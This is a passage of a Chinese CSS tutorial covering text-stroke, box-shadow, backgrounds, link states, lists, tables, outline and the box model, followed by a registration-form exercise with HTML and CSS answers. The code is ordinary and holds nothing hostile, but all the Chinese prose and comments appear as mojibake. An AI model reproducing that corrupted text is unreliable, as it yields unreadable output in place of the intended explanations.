html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>text-stroke_CSS</title>\n<style>\n\tp{\n\t\tfont-size:50px; \n\t}\n\t#text-stroke{\n\t\t-webkit-text-stroke:2px red;\n\t\t}\n\t#text-hollow{\n\t\tcolor:white;\n\t\t-webkit-text-stroke:2px red;\n\t\t}\n</style>\n</head>\n<body>\n<div>\n\t<h1>æ–‡å­—æè¾¹ï¼š</h1>\n\t<p id=\"text-stroke\">HTML5+CSS3</p>\n    \n    <h1>æ–‡å­—é•‚ç©ºï¼š</h1>\n\t<p id=\"text-hollow\">HTML5+CSS3</p>\n</div>\n</body>\n</html>\n```\n![](https://i.loli.net/2020/04/07/ijA8S4cxBqvfo1X.png)\n\n#### 13.6 box-shadow **ç›’å­é˜´å½±**\n\n> è¯­æ³•ä¸€ï¼šbox-shadow: *h-shadow | v-shadow | blur | spread | color |* inset;\n\n| å€¼         | è¯´æ˜                                                   |\n| ---------- | ------------------------------------------------------ |\n| *h-shadow* | é˜´å½±çš„æ°´å¹³åç§»ã€‚å…è®¸è´Ÿå€¼                               |\n| *v-shadow* | é˜´å½±çš„å‚ç›´åç§»ã€‚å…è®¸è´Ÿå€¼                               |\n| *blur*     | å¯é€‰ã€‚æ¨¡ç³Šè·ç¦»                                         |\n| *spread*   | å¯é€‰ã€‚é˜´å½±å»¶ä¼¸çš„å¤§å°ï¼Œå¯ç†è§£ä¸ºæŠŠé˜´å½±å‘ä¸¤ä¸ªæ–¹å‘åŠ å¤§å°ºåº¦ |\n| *color*    | å¯é€‰ã€‚é˜´å½±çš„é¢œè‰²ã€‚                                     |\n| inset      | å¯é€‰ã€‚å†…é˜´å½±                                           |\n\næ³¨ï¼šå‰4ä¸ªå‚æ•°å•ä½éƒ½ä¸€æ ·ï¼Œå› æ­¤éœ€æ³¨æ„é¡ºåºï¼\n\n> è¯­æ³•äºŒï¼šå¤šé‡é˜´å½±\n> box-shadow: h-shadow v-shadow blur spread color inset ,\n> \t\t\t\t\t\th-shadow v-shadow blur spread color inset ,\n> \t\t\t\t\t\th-shadow v-shadow blur spread color inset;\n\nå®ä¾‹\n\n```html\n<!DOCTYPE html>\n<html lang=\"zh-cn\">\n<head>\n<meta charset=\"utf-8\" />\n<title>box-shadow_CSS</title>\n<style>\n.test li{margin-top:20px;list-style:none;}\n\n.test .out{\n\t width:400px;\n\t padding:10px; \n\t background:#eee;\n\t\n}\n.test .outset{\n\t width:400px;\n\t padding:10px; \n\t background:#eee;\n\t-webkit-box-shadow:5px 5px pink;/* -webkit-ï¼šå†…æ ¸ */\n\t\n}\n\n.test .outset-blur{\n\twidth:400px;\n\tpadding:10px;\n\tbackground:#eee;\n\t-webkit-box-shadow:5px 5px 5px pink;\n}\n.test .outset-extension{\n\twidth:400px;\n\tpadding:10px;\n\tbackground:#eee;\n\t-webkit-box-shadow:5px 5px 5px 10px pink;\n\tbox-shadow:5px 5px 5px 10px pink;\n\t}\n\n.test .inset{\n\twidth:400px;\n\tpadding:10px;\n\tbackground:#eee;\n\t-webkit-box-shadow:2px 2px 5px 1px pink inset;\n\tbox-shadow:2px 2px 5px 1px pink inset;\n\t}\n\t\n.test .multiple-shadow{\n\twidth:400px;\n\tpadding:10px;\n\tbackground:#eee;\n\tbox-shadow:0 0 5px 3px red,\n\t\t\t\t0 0 5px 9px green,\n\t\t\t\t0 0 5px 15px yellow;}\n</style>\n</head>\n<body>\n<ul class=\"test\">\n    <li class=\"out\">æ— æ•ˆæœ<br/>æ— æ•ˆæœ</li>\n\t<li class=\"outset\">å¤–é˜´å½±å¸¸è§„æ•ˆæœ<br/>box-shadow:5px 5px pink;</li>\n\t<li class=\"outset-blur\">å¤–é˜´å½±æ¨¡ç³Šæ•ˆæœ<br/>box-shadow:5px 5px 5px pink;</li>\n\t<li class=\"outset-extension\">å¤–é˜´å½±æ¨¡ç³Šå¤–å»¶æ•ˆæœ<br/>box-shadow:5px 5px 5px 10px pink;</li>\n\t<li class=\"inset\">å†…é˜´å½±æ•ˆæœ<br/>box-shadow:2px 2px 5px 1px pink inset;</li>\n\t<li class=\"multiple-shadow\">å¤–é˜´å½±æ¨¡ç³Šæ•ˆæœ<br/>box-shadow:0px 0px 5px 3px color ;</li>\n</ul>\n</body>\n</html>\n```\n\n![](https://i.loli.net/2020/04/08/fmAqZiD1zVT7b3c.png)\n\n### 14 èƒŒæ™¯\n\nèƒŒæ™¯å±æ€§\n![](https://i.loli.net/2019/08/16/4SeOwBaox6sy1i2.png)\nèƒŒæ™¯è‰²\n\n```css\np {background-color: gray;}\n```\nå¦‚æœæ‚¨å¸Œæœ›èƒŒæ™¯è‰²ä»å…ƒç´ ä¸­çš„æ–‡æœ¬å‘å¤–å»¶ä¼¸ï¼Œåªéœ€å¢åŠ ä¸€äº›å†…è¾¹è·ï¼š\n```css\np {background-color: gray; padding: 20px;}\n```\nèƒŒæ™¯å›¾åƒ\n```css\nbody {background-image: url(\"eg.png\");}\np{background-image: url(\"eg.png\");}\n```\nèƒŒæ™¯é‡å¤\nå¦‚æœéœ€è¦åœ¨é¡µé¢ä¸Šå¯¹èƒŒæ™¯å›¾åƒè¿›è¡Œå¹³é“ºï¼Œå¯ä»¥ä½¿ç”¨ background-repeat å±æ€§ã€‚\n\nå±æ€§å€¼ `repeat` å¯¼è‡´å›¾åƒåœ¨æ°´å¹³å‚ç›´æ–¹å‘ä¸Šéƒ½å¹³é“ºï¼Œå°±åƒä»¥å¾€èƒŒæ™¯å›¾åƒçš„é€šå¸¸åšæ³•ä¸€æ ·ã€‚`repeat-x` å’Œ `repeat-y` åˆ†åˆ«å¯¼è‡´å›¾åƒåªåœ¨æ°´å¹³æˆ–å‚ç›´æ–¹å‘ä¸Šé‡å¤ï¼Œ`no-repeat` åˆ™ä¸å…è®¸å›¾åƒåœ¨ä»»ä½•æ–¹å‘ä¸Šå¹³é“ºã€‚\n\né»˜è®¤åœ°ï¼ŒèƒŒæ™¯å›¾åƒå°†é‡å¤yè½´\n```css\nbody\n  { \n  background-image: url('eg.gif');\n  background-repeat: repeat-y;\n  }\n```\nèƒŒæ™¯å®šä½\nå¯ä»¥åˆ©ç”¨ background-position å±æ€§æ”¹å˜å›¾åƒåœ¨èƒŒæ™¯ä¸­çš„ä½ç½®ã€‚\n\nä¸‹é¢çš„ä¾‹å­åœ¨ body å…ƒç´ ä¸­å°†ä¸€ä¸ªèƒŒæ™¯å›¾åƒå±…ä¸­æ”¾ç½®ï¼š\n```css\nbody\n  { \n    background-image:url('eg.gif');\n    background-repeat:no-repeat;\n    background-position:center;\n  }\n```\nä¸º background-position å±æ€§æä¾›å€¼æœ‰å¾ˆå¤šæ–¹æ³•ã€‚é¦–å…ˆï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›å…³é”®å­—ï¼š`topã€bottomã€leftã€right å’Œ center`é€šå¸¸ï¼Œè¿™äº›å…³é”®å­—ä¼šæˆå¯¹å‡ºç°ï¼Œä¸è¿‡ä¹Ÿä¸æ€»æ˜¯è¿™æ ·ã€‚è¿˜å¯ä»¥ä½¿ç”¨é•¿åº¦å€¼ï¼Œå¦‚ 100px æˆ– 5cmï¼Œæœ€åä¹Ÿå¯ä»¥ä½¿ç”¨ç™¾åˆ†æ•°å€¼ã€‚ä¸åŒç±»å‹çš„å€¼å¯¹äºèƒŒæ™¯å›¾åƒçš„æ”¾ç½®ç¨æœ‰å·®å¼‚ã€‚\n\nå…³é”®å­—\nå›¾åƒæ”¾ç½®å…³é”®å­—æœ€å®¹æ˜“ç†è§£ï¼Œå…¶ä½œç”¨å¦‚å…¶åç§°æ‰€è¡¨æ˜çš„ã€‚ä¾‹å¦‚ï¼Œ`top right` ä½¿å›¾åƒæ”¾ç½®åœ¨å…ƒç´ å†…è¾¹è·åŒºçš„å³ä¸Šè§’ã€‚\n\nå¦‚æœåªå‡ºç°ä¸€ä¸ªå…³é”®å­—ï¼Œåˆ™è®¤ä¸ºå¦ä¸€ä¸ªå…³é”®å­—æ˜¯ centerã€‚\næ‰€ä»¥ï¼Œå¦‚æœå¸Œæœ›æ¯ä¸ªæ®µè½çš„ä¸­éƒ¨ä¸Šæ–¹å‡ºç°ä¸€ä¸ªå›¾åƒï¼Œåªéœ€å£°æ˜å¦‚ä¸‹ï¼š\n```css\np{ \n    background-image:url('bgimg.gif');\n    background-repeat:no-repeat;\n    background-position:top;\n  }\n```\n![](https://i.loli.net/2019/08/16/s5fwqFjCNegUav4.png)\n\né•¿åº¦å€¼\né•¿åº¦å€¼è§£é‡Šçš„æ˜¯å…ƒç´ å†…è¾¹è·åŒºå·¦ä¸Šè§’çš„åç§»ã€‚åç§»ç‚¹æ˜¯å›¾åƒçš„å·¦ä¸Šè§’ã€‚\n\næ¯”å¦‚ï¼Œå¦‚æœè®¾ç½®å€¼ä¸º 50px 100pxï¼Œå›¾åƒçš„å·¦ä¸Šè§’å°†åœ¨å…ƒç´ å†…è¾¹è·åŒºå·¦ä¸Šè§’å‘å³ 50 åƒç´ ã€å‘ä¸‹ 100 åƒç´ çš„ä½ç½®ä¸Šï¼š\n```css\nbody\n  { \n    background-image:url('eg.gif');\n    background-repeat:no-repeat;\n    background-position:50px 100px;\n  }\n```\nèƒŒæ™¯å…³è”\nå¦‚æœæ–‡æ¡£æ¯”è¾ƒé•¿ï¼Œé‚£ä¹ˆå½“æ–‡æ¡£å‘ä¸‹æ»šåŠ¨æ—¶ï¼ŒèƒŒæ™¯å›¾åƒä¹Ÿä¼šéšä¹‹æ»šåŠ¨ã€‚å½“æ–‡æ¡£æ»šåŠ¨åˆ°è¶…è¿‡å›¾åƒçš„ä½ç½®æ—¶ï¼Œå›¾åƒå°±ä¼šæ¶ˆå¤±ã€‚\n\næ‚¨å¯ä»¥é€šè¿‡ background-attachment å±æ€§é˜²æ­¢è¿™ç§æ»šåŠ¨ã€‚é€šè¿‡è¿™ä¸ªå±æ€§ï¼Œå¯ä»¥å£°æ˜å›¾åƒç›¸å¯¹äºå¯è§†åŒºæ˜¯å›ºå®šçš„ï¼ˆfixedï¼‰ï¼Œå› æ­¤ä¸ä¼šå—åˆ°æ»šåŠ¨çš„å½±å“ï¼š\n```css\nbody \n  {\n  background-image:url(/i/eg_bg_02.gif);\n  background-repeat:no-repeat;\n  background-attachment:fixed\n  }\n```\nbackground-attachment å±æ€§çš„é»˜è®¤å€¼æ˜¯ scrollï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨é»˜è®¤çš„æƒ…å†µä¸‹ï¼ŒèƒŒæ™¯ä¼šéšæ–‡æ¡£æ»šåŠ¨ã€‚\n\n### 15 é“¾æ¥\n\né“¾æ¥æ ·å¼çš„ CSS å±æ€§æœ‰å¾ˆå¤šç§ï¼ˆä¾‹å¦‚ color, font-family, background ç­‰ç­‰ï¼‰\né“¾æ¥çš„å››ç§çŠ¶æ€ï¼š\n\n```css\na:link - æœªè¢«è®¿é—®çš„é“¾æ¥\na:visited - ç”¨æˆ·å·²è®¿é—®çš„é“¾æ¥\na:hover - é¼ æ ‡æŒ‡é’ˆä½äºé“¾æ¥çš„ä¸Šæ–¹\na:active - é“¾æ¥è¢«ç‚¹å‡»çš„æ—¶åˆ»\n```\nç¤ºä¾‹ï¼šå››ç§çŠ¶æ€ä¸‹çš„é¢œè‰²æƒ…å†µ\n```css\na:link {color:#FF0000;}\t\t/* æœªè¢«è®¿é—®çš„é“¾æ¥ */\na:visited {color:#00FF00;}\t/* å·²è¢«è®¿é—®çš„é“¾æ¥ */\na:hover {color:#FF00FF;}\t/* é¼ æ ‡æŒ‡é’ˆç§»åŠ¨åˆ°é“¾æ¥ä¸Š */\na:active {color:#0000FF;}\t/* æ­£åœ¨è¢«ç‚¹å‡»çš„é“¾æ¥ */\n```\nç¤ºä¾‹ï¼šå››ç§çŠ¶æ€ä¸‹çš„ä¸‹åˆ’çº¿(text-decoration)æƒ…å†µ\n```css\na:link {text-decoration:none;}\na:visited {text-decoration:none;}\na:hover {text-decoration:underline;}\na:active {text-decoration:underline;}\n```\n### 16 åˆ—è¡¨\n\nåˆ—è¡¨å±æ€§\n![](https://i.loli.net/2019/08/18/1P49IeVr2fvzKAj.png)\nHTMLç¤ºä¾‹\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>cssåˆ—è¡¨</title>\n<link rel=\"stylesheet\" type=\"text/css\"href=\"style.css\"> \n</head>\n<body>\n   <ul>\n       <li>è‹¹æœ</li>\n       <li>è¥¿ç“œ</li>\n       <li>é¦™è•‰</li>\n   </ul>\n</body>\n</html>\n\n```\nåˆ—è¡¨é¡¹çš„æ ‡å¿—ç±»å‹ï¼ˆlist-style-typeï¼‰\n```css\nul{\n    list-style-type: square    /*æ–¹å½¢*/\n}\n```\nè¿è¡Œç»“æœ\n![](https://i.loli.net/2019/08/18/AwXMEhPfI4oaSDV.png)\nåˆ—è¡¨é¡¹å›¾åƒ (list-style-image)\n\n```css\nul{\n     list-style-image: url(\"dance.gif\"); \n}\n```\nè¿è¡Œç»“æœ\n![](https://i.loli.net/2019/08/18/q5mpI7wT9cJKeCx.png)\nåˆ—è¡¨é¡¹ç›®æ ‡è®°çš„ä½ç½®ï¼š(list-style-position)\n![](https://i.loli.net/2019/08/18/AQXMczo9gUk3E5N.png)\n\n```css\nul\n  {\n  list-style-position:inside;\n  }\n```\n  ![](https://i.loli.net/2019/08/18/nplIEf3rh2s8oUj.png)\n### 17 è¡¨æ ¼\n\n![](https://i.loli.net/2019/08/18/p5UNxIGaCz9yw8f.png)\nç¤ºä¾‹\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<style type=\"text/css\">\n    #customers\n      {\n      font-family:\"Trebuchet MS\", Arial, Helvetica, sans-serif;\n      width:100%;\n      border-collapse:collapse;\n      }\n    \n    #customers td, #customers th \n      {\n      font-size:1em;\n      border:2px solid blue;\n      padding:3px 7px 2px 7px;\n      }\n    \n    #customers th \n      {\n      font-size:1.1em;\n      text-align:left;\n      padding-top:5px;\n      padding-bottom:4px;\n      background-color:#A7C942;\n      color:#ffffff;\n      }\n    \n    #customers tr.alt td \n      {\n      color:crimson; \n      background-color:darksalmon;\n      }\n</style>\n</head>\n\n<body>\n<table id=\"customers\">\n    <tr>\n        <th>Company</th>\n        <th>Contact</th>\n        <th>Country</th>\n    </tr>\n\n    <tr>\n        <td>Apple</td>\n        <td>Steven Jobs</td>\n        <td>USA</td>\n    </tr>\n\n    <tr class=\"alt\">\n        <td>Baidu</td>\n        <td>Li YanHong</td>\n        <td>China</td>\n    </tr>\n\n    <tr>\n        <td>Google</td>\n        <td>Larry Page</td>\n        <td>USA</td>\n    </tr>\n\n    <tr class=\"alt\">\n        <td>Lenovo</td>\n        <td>Liu Chuanzhi</td>\n        <td>China</td>\n    </tr>  \n</table>\n</body>\n</html>\n```\nè¿è¡Œç»“æœï¼š\n![](https://i.loli.net/2019/08/18/nd8WT1AqZDPpKi4.png)\n\n### 18 è½®å»“\n\n ![](https://i.loli.net/2019/08/18/4hUTxW5v9ikRQ2A.png)\nç¤ºä¾‹ï¼š`<p>çªå‡ºæ•ˆæœ</p>`\n\n```css\np{\n    outline-color:red;\n    outline-style:groove; /*å‡¹æ§½å½¢å¼*/\n    outline-width:5px\n}\nä¸Šä¸‹æ•ˆæœç­‰åŒ\np{\n    outline:red groove 5px;\n}\n```\nè¿è¡Œç»“æœï¼š\n![](https://i.loli.net/2020/03/10/E9xX4VJhgDeYCiM.png)\n\n### 19 ç›’å­æ¨¡å‹\n\n> æ‰€æœ‰HTMLå…ƒç´ å¯ä»¥çœ‹ä½œç›’å­,å®ƒåŒ…æ‹¬ï¼šè¾¹è·ï¼Œè¾¹æ¡†ï¼Œå¡«å……ï¼Œå’Œå®é™…å†…å®¹ã€‚\n\n![](https://www.runoob.com/images/box-model.gif)\n\n- **Margin(å¤–è¾¹è·)** - æ¸…é™¤è¾¹æ¡†å¤–çš„åŒºåŸŸï¼Œå¤–è¾¹è·æ˜¯é€æ˜çš„ã€‚\n- **Border(è¾¹æ¡†)** - å›´ç»•åœ¨å†…è¾¹è·å’Œå†…å®¹å¤–çš„è¾¹æ¡†ã€‚\n- **Padding(å†…è¾¹è·)** - æ¸…é™¤å†…å®¹å‘¨å›´çš„åŒºåŸŸï¼Œå†…è¾¹è·æ˜¯é€æ˜çš„ã€‚\n- **Content(å†…å®¹)** - ç›’å­çš„å†…å®¹ï¼Œæ˜¾ç¤ºæ–‡æœ¬å’Œå›¾åƒã€‚\n\nå½“æ‚¨æŒ‡å®šä¸€ä¸ªå…ƒç´ çš„å®½åº¦å’Œé«˜åº¦å±æ€§æ—¶ï¼Œä½ åªæ˜¯è®¾ç½®äº†`å†…å®¹åŒºåŸŸçš„å®½åº¦å’Œé«˜åº¦`ã€‚è¦çŸ¥é“ï¼Œå®Œå…¨å¤§å°çš„å…ƒç´ ï¼Œä½ è¿˜å¿…é¡»æ·»åŠ å¡«å……ï¼Œè¾¹æ¡†å’Œè¾¹è·ã€‚[å®ä¾‹](https://www.runoob.com/try/try.php?filename=trycss_boxmodel)\n\nmarginè¯¦ç»†ï¼šhttps://www.runoob.com/css/css-margin.html\n\nborderè¯¦ç»†ï¼šhttps://www.runoob.com/css/css-border.html\n\npaddingè¯¦ç»†ï¼šhttps://www.runoob.com/css/css-padding.html\n\n## CSSå®ä¾‹ç»ƒä¹ \n\n### ç›®çš„\n\n- æŒæ¡ç±»ã€æ ‡ç­¾ã€IDã€å…ƒç´ çŠ¶æ€ä¼ªç±»ã€ç›®æ ‡ä¼ªç±»ç­‰é€‰æ‹©å™¨çš„ä½¿ç”¨ï¼›\n\n- æŒæ¡æ–‡æœ¬ã€æ–‡æœ¬é˜´å½±ã€æ–‡æœ¬å¯¹é½ï¼›\n\n- èƒŒæ™¯å›¾åƒã€æ™¯èƒŒé¢œè‰²ã€èƒŒæ™¯å®šä½ã€è¾¹æ¡†ã€è¾¹æ¡†åœ†è§’çš„è®¾ç½®ï¼›\n\n- æŒæ¡ç›’å­æ¨¡å‹ã€é¡µé¢å®½åº¦è‡ªé€‚åº”æ§åˆ¶ã€å¯¹é½æ–¹å¼å’Œæµ®åŠ¨å®šä½ï¼›\n\n### é¢˜ç›®\n\n**ä¿®æ”¹Regiser.htmlæ–‡æ¡£ï¼Œåˆ›å»ºå¹¶é“¾æ¥â€œmystyle.cssâ€æ ·å¼è¡¨ï¼Œä½¿ç”¨CSSè®¾è®¡é¡µé¢å¸ƒå±€ï¼Œæ›¿æ¢åŸæœ‰è¡¨æ ¼å¸ƒå±€ï¼Œé¡µé¢æ•ˆæœéœ€å°½å¯èƒ½ä¸å›¾1ã€2ä¸€è‡´ï¼Œä¸»è¦è¦æ±‚å¦‚ä¸‹ï¼š**\n\n>(1)\tè®¾ç½®é¡µé¢çˆ¶å®¹å™¨å®½åº¦éšæµè§ˆå™¨çª—å£å¤§å°è‡ªé€‚åº”æ”¹å˜ï¼Œä½†æœ€å°ä¸å°äº400pxï¼Œæœ€å¤§ä¸å¤§äº700pxï¼Œå¹¶ä¸”å±…ä¸­æ˜¾ç¤ºï¼Œè®¾ç½®è¾¹æ¡†ã€èƒŒæ™¯è‰²å’Œå­—ç¬¦é—´è·ï¼›\n>(2)\tè®¾ç½®é»˜è®¤å­—ä½“å¤§å°ä¸º13pxï¼Œè®¾ç½®æ ‡é¢˜â€œæ³¨å†Œä¿¡æ¯â€çš„å¤§å°ä¸ºé»˜è®¤å­—ä½“çš„1.5å€ï¼Œå­—ä½“é€æ˜ï¼Œä½¿ç”¨ä¸‰é‡æ–‡æœ¬é˜´å½±æ˜¾ç¤ºï¼ˆçº¢ã€è“ã€ç»¿ï¼‰ï¼Œåˆ†åˆ«ä½¿ç”¨rgbaè®¾ç½®å…·æœ‰ä¸€å®šé€æ˜åº¦çš„é˜´å½±é¢œè‰²ï¼›\n>(3)\té¡µé¢æ¯ä¸€è¡Œï¼ˆå¯¹åº”ä¸€ç±»ä¿¡æ¯ï¼‰æ”¾åœ¨ä¸€ä¸ªdivä¸­ï¼Œè®¾ç½®divèƒŒæ™¯è‰²å’Œåœ†è§’è¾¹æ¡†ï¼›\n>(4)\tæ¯ä¸€è¡Œçš„æç¤ºæ–‡æœ¬ã€è¾“å…¥æ¡†å’Œå³ä¾§è¾…åŠ©ä¿¡æ¯ä¿æŒå‚ç›´å±…ä¸­å¯¹é½ï¼Œä¸”ä¿éšœå„è¡Œé—´çš„å„åŒç±»å…ƒç´ æ°´å¹³å¯¹é½ï¼›\n>(5)\tå§“åå’Œå¯†ç è¾“å…¥æ¡†ä¸­æ˜¾ç¤ºèƒŒæ™¯å›¾åƒï¼›\n>(6)\tå•é€‰æŒ‰é’®å’Œå¤é€‰æŒ‰é’®è¢«é€‰ä¸­æ—¶ï¼Œå…¶åçš„è¾…åŠ©æ–‡æœ¬åŠ¨æ€å˜åŒ–ä¸ºçº¢è‰²å­—ä½“ï¼›\n>(7)\tç”¨æˆ·å•å‡»â€œè¿”å›é¡¶éƒ¨â€æ—¶å›åˆ°é¡µé¢é¡¶éƒ¨ï¼Œå¹¶ä¸”æ ‡é¢˜å­—ä½“å˜ä¸ºçº¢è‰²ã€‚\n>(8)\tæ³¨æ„ï¼šé™¤äº†è¡¨æ ¼ç›¸å…³çš„æ ‡ç­¾ï¼Œä¸èƒ½ä¿®æ”¹å…¶ä½™æ ‡ç­¾ã€‚\n\n| æ•ˆæœå›¾                                                  | æ•ˆæœå›¾                                                  |\n| ------------------------------------------------------- | ------------------------------------------------------- |\n| ![å›¾1](https://img.jwt1399.top//img/20200810170438.png) | ![å›¾2](https://img.jwt1399.top//img/20200810164536.jpg) |\n\n### è§£ç­”\n\n#### Regiser.html\n\n```html\n<!doctype html>\n<html>\n\t<head>\n\t<meta charset=\"utf-8\">\n\t<title>æ–°ç”ŸæŠ¥åˆ°</title>\n\t<link href=\"styles/mystyle.css\" rel=\"stylesheet\" type=\"text/css\">\n\t\n\t</head>\n\t<body>\n\t<div id=\"wrapper\">\n\t\t<h3 id=\"title\" align=\"center\">æ³¨ å†Œ ä¿¡ æ¯</h3>\n\t\t<hr noshade size=\"1\" width=\"99%\">\n\t\t<form action=\"\" id=\"form1\" autocomplete=\"on\" method=\"get\">\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å§“åï¼š</span>  \n\t\t\t\t<input type=\"text\" class=\"item-inp\" name=\"user_name\" maxlength=\"10\" autofocus required/><span class=\"star\"> *</span>\n\t\t\t</div>\n\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å­¦å·ï¼š</span>  \n\t\t\t\t<input type=\"text\" class=\"item-inp\" name=\"user_id\" required/><span class=\"star\"> *</span>\n\t\t\t</div>\t\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å¯†ç ï¼š</span> \n\t\t\t\t<input type=\"password\" class=\"item-inp\" name=\"user_paw\"  placeholder=\"è¯·è¾“å…¥8ä½å¯†ç \" required /><span class=\"star\"> *</span>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">æ€§åˆ«ï¼š</span>\n\t\t\t\t<div class=\"item-inp\"><label><input type=\"radio\" name=\"user_sex\" value=\"man\"/><span>ç”·</span></label>\n\t\t\t\t<input type=\"radio\" id=\"user_sex\"  name=\"user_sex\" value=\"woman\" checked/><label for=\"user_sex\">å¥³</label>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">èº«é«˜ï¼š</span>\n\t\t\t\t<input type=\"number\" class=\"item-inp\" name=\"user_height\" min=\"150\" max=\"190\" value=\"175\" step=\"5\" /> å˜ç±³\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">ä½“é‡ï¼š</span>\n\t\t\t\t<input type=\"range\" class=\"item-inp\" name=\"user_weight\" min=\"45\" max=\"90\" value=\"55\" step=\"2\" /> åƒå…‹\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å‡ºç”Ÿæ—¥æœŸï¼š</span>\n\t\t\t\t<input type=\"date\"  class=\"item-inp\" name=\"user_birthday\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">ç”µè¯å·ç ï¼š</span>\n\t\t\t\t<input type=\"tel\" class=\"item-inp\" name=\"user_tel\" pattern=\"\\d{11}\" placeholder=\"è¯·è¾“å…¥11æ‰‹æœºå·ç \"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">E-mailï¼š</span>\n\t\t\t\t<input type=\"email\" class=\"item-inp\" name=\"user_email\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">ä¸ªäººä¸»é¡µï¼š</span>\n\t\t\t\t<input type=\"url\" class=\"item-inp\" name=\"user_homepage\" autocomplete=\"off\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å®¶åº­ä½å€ï¼š</span>\n\t\t\t\t<select class=\"item-inp\" name=\"user_address\" >\n\t\t\t\t\t<option value=\"0\" >åŒ—äº¬</option>\n\t\t\t\t\t<option value=\"1\" >ä¸Šæµ·</option>\n\t\t\t\t\t<option value=\"2\" selected>æˆéƒ½</option>\n\t\t\t\t</select>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">é‚®æ”¿ç¼–ç ï¼š</span>\n\t\t\t\t<input type=\"text\" class=\"item-inp\" name=\"user_zipcode\" pattern=\"[0-9]{6}\" placeholder=\"è¯·è¾“å…¥6ä½é‚®æ”¿ç¼–ç \" />\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">æœ€çˆ±çš„é¢œè‰²ï¼š</span>\n\t\t\t\t\t<input type=\"color\" class=\"item-inp\" name=\"user_color\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å–œæ¬¢çš„è¿åŠ¨ï¼š</span>\n\t\t\t\t<input type=\"checkbox\" name=\"user_habit1\" value=\"basketball\"/><span>ç¯®çƒ</span>\n\t\t\t    <input type=\"checkbox\" name=\"user_habit2\" value=\"football\" checked><span>è¶³çƒ</span>\n\t\t\t    <input type=\"checkbox\" name=\"user_habit3\" value=\"swimming\"><span>æ¸¸æ³³</span>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å–œæ¬¢çš„ç½‘ç«™ï¼š</span>\n\t\t\t\t<input type=\"url\" class=\"item-inp\" name=\"user_favurl\" list=\"urllist\"/>\n\t\t\t\t<datalist id=\"urllist\" >\n\t\t\t\t\t\t<option label=\"ç™¾åº¦\" value=\"http://www.baidu.com\"/>\n\t\t\t\t\t\t<option label=\"æ–°æµª\" value=\"http://www.sina.com\"/>\n\t\t\t\t\t\t<option label=\"è°·æ­Œ\" value=\"http://www.google.com\"/>\n\t\t\t\t\t\t<option value=\"http://www.163.com\">ç½‘æ˜“</option>\n\t\t\t\t</datalist>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">ç”Ÿæ´»ç…§2å¼ ï¼š</span>\n\t\t\t\t<input type=\"file\" class=\"item-inp\" name=\"user_album\"  multiple/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">ä¸ªäººè‡ªè¿°ï¼š</span>\n\t\t\t\t\t<textarea name=\"info\" rows=\"5\" cols=\"50\">æˆ‘æ˜¯ä¸€ä½ç‰¹åˆ«çƒ­çˆ±å­¦ä¹ çš„å¥½å­©å­ã€‚ã€‚ã€‚</textarea>\n\t\t\t</div>\n\t\t\t\t\n\t\t\t\t<input type=\"hidden\" name=\"user_secret\" value=\"7\"/>\n\t\t\t\t\n\t\t\t<div class=\"info-item\" style=\"text-align:center;\">\n\t\t\t\t\t<input type=\"submit\" class=\"item-bt\" value=\"æ³¨å†Œ\" style=\"margin-right:100px;\"/>   <input type=\"reset\" class=\"item-bt\" value=\"é‡ç½®\" />\n\t\t\t</div>\n\t\t\t\t\t<hr noshade size=\"1\" width=\"99%\">\n\t\t\t\n\t\t\t\t<ul class=\"info-item\">\n\t\t\t\t\t\t<li><a href=\"tel:10086\">ç”µè¯</a></li>\n\t\t\t\t\t\t<li><a href=\"sms:10086\">çŸ­ä¿¡</a></li>\n\t\t\t\t\t\t<li><a href=\"mailto:10086@sina.com\">E-mail</a></li>\n\t\t\t\t\t\t<li><a href=\"#title\">è¿”å›é¡¶éƒ¨</a></li>\n\t\t\t\t</ul>\n\t</form>\n\t</div>\t\n\t<script>\n\t</script>\t\n</body>\n</html>\n```\n\n#### mystyle.css\n\n```css\n@charset \"utf-8\";\n/* CSS Document */\n*{\n\t\tfont-size:13px;/*é¢˜ç›®2*/\n\t}\na {\ntext-decoration: none;\n}\na:link {\n\tcolor: blue;\n}\na:visited {\n\tcolor: gray;\n}\na:hover {\n\tcolor: red;\n}\na:active {\n\tcolor: yellow;\n}\n#wrapper {/*é¢˜ç›®1*/\n\twidth: 95%;\n\tmin-width: 400px;\n\tmax-width: 700px;\n\tmargin: 10px auto;/*ä¸Šä¸‹é—´éš™10px,å·¦å³å±…ä¸­*/\n\tpadding-top:5px;/*ä¸Šå†…è¾¹è·*/\n\tborder: 1px solid #ccc;\n\tbackground-color: #eee;\n\tletter-spacing: 0.2em;/*å­—æ¯é—´è·*/\n}\n\n#title {/*é¢˜ç›®2*/\n\ttext-align: center;\n\tcolor: transparent;\n\tfont-size: 1.5em;\n\tfont-weight: 